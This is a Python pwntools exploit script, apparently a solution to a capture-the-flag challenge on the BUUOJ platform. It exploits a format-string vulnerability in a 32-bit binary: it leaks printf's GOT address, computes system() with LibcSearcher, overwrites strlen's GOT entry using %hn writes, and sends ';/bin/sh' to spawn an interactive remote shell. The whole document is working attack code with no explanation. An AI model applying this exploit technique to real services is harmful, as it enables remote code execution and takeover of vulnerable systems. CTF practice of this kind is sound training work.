from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 29367)

please_tell_me = 0x804887D
printf_got = 0x804A014
strlen_got = 0x804A024

payload = "a" + p32(printf_got) + "22" + "%8$s"

io.recvuntil("Please tell me:")
io.send(payload)

io.recvuntil("22")
addr = u32(io.recv(4))
print(hex(addr))
# 0xf7db7020

lib = LibcSearcher("printf", addr)
base = addr - lib.dump("printf")
system = base + lib.dump("system")

# system = addr - 0xe6e0

high_sys = (system >> 16) & 0xffff
low_sys = system & 0xffff
# low < hign
# so write low_sys first

# len("Repeater:") + len("a") + len(p32(strlen_got) + p32(strlen_got+2)) = 18
# %hn to write 2 bytes
payload = "a" + p32(strlen_got) + p32(strlen_got+2) + "%" + str(low_sys-18) + "c%8$hn" + "%" + str(high_sys - low_sys) + "c%9$hn"
io.recvuntil("Please tell me:")
io.send(payload)

io.recvuntil("Please tell me:")
payload = ";" + "/bin/sh"
io.send(payload)
'''
You can choose it by hand
Or type 'exit' to quit:9
[+] ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64) be choosed.
'''


io.interactive()